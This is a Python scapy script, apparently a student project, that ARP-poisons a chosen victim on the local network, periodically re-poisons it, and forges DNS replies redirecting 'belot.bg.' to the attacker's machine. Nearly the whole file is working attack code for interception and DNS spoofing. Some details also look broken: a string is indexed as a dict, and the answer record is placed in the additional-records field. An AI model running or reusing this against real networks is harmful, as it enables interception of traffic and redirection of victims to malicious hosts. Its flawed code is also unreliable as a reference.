from scapy.all import *
import netifaces as ni
import search_hosts as sh
import arp_spoofing as arp
import final_project_code as fpc
import time

REPOISON_TIME = int(10)
dns_hosts = {
    b"belot.bg.": "10.0.2.6",
}

# target_ip = "10.0.2.4"
# ip_to_spoof = "10.0.2.6"




def ssl_striptease():
    print("\nStarting DNS spoofing...")
    ssl_dns_spoofing()
    print("\nDNS Spoofing Complete!")


def ssl_dns_spoofing():
    conf.verb = 0 # make scapy verbose (no output)

    iface = fpc.get_interface()

    my_addresses = sh.get_my_details(iface)

    print("Searching for active hosts in the subnet...")
    active_hosts = sh.search_hosts(iface)

    print("\nInput the IP address of the target out of the active hosts:")
    target = fpc.validate_ip(active_hosts, "")

    #print("\nInput the IP address of the attacker out of the active hosts:")
    fake_site = my_addresses['ip']

    # Get the IP addresses of the default gateways of the selected interface
    gateways = []
    for key, val in ni.gateways()["default"].items():
        if val[1] == iface:
            gateways.append(val)

    print("\nStarting poisoning...")
    # Start ARP poisoning
    
    for gw_ip, gw_iface in gateways:
        arp.one_way_arp_start(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface)

    print("Poisoning complete!")

    dns_spoof_and_repoison(my_addresses, gateways, target, fake_site, iface)

    # TODO stop arp poisoning

def dns_spoof_and_repoison(my_addresses, gateways, target, fake_site, iface):
    last_poison_time = time.time() - REPOISON_TIME
    _filter = "udp"

    while True:
        # sniff for 1 packet that adheres to the {_filter}
        sniff(prn=process_udp_pkt(target, fake_site, iface), filter=_filter, store=0, count=1, timeout=REPOISON_TIME)   

        # {REPOISON_TIME} seconds have passed => should repoison
        current_time = time.time()
        if current_time - last_poison_time > REPOISON_TIME - 0.5:
            repoison(my_addresses, gateways, target, iface)
            last_poison_time = current_time

def repoison(my_addresses, gateways, target, iface):
    print("Repoisoning")
    for gw_ip, gw_iface in gateways:
        arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2)

def process_udp_pkt(target, fake_site, iface):
    def process_udp_pkt_inside(pkt): 
        if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
            resp_packet = build_dns_response_packet(pkt, fake_site["ip"])
            sendp(resp_packet, iface=iface)
        else: 
            pass
            #print("Found another packet")
    return process_udp_pkt_inside

def build_dns_response_packet(pkt, malicious_ip):
        eth = Ether(
                    src = pkt[Ether].dst,
                    dst = pkt[Ether].src)

        ip = IP(
                src = pkt[IP].dst,
                dst = pkt[IP].src)

        udp = UDP(
                dport = pkt[UDP].sport,
                sport = pkt[UDP].dport)

        dns = DNS(
                id = pkt[DNS].id,
                qd = pkt[DNS].qd,
                aa = 1,
                rd = 0,
                qr = 1,
                qdcount = 1,
                ancount = 1,
                nscount = 0,
                arcount = 0,
                ar = DNSRR(
                        rrname = pkt[DNS].qd.qname,
                        type = 'A',
                        ttl = 600,
                        rdata = malicious_ip))

        new_pkt = eth / ip / udp / dns
        return new_pkt

# call main
if __name__=="__main__":
    ssl_striptease()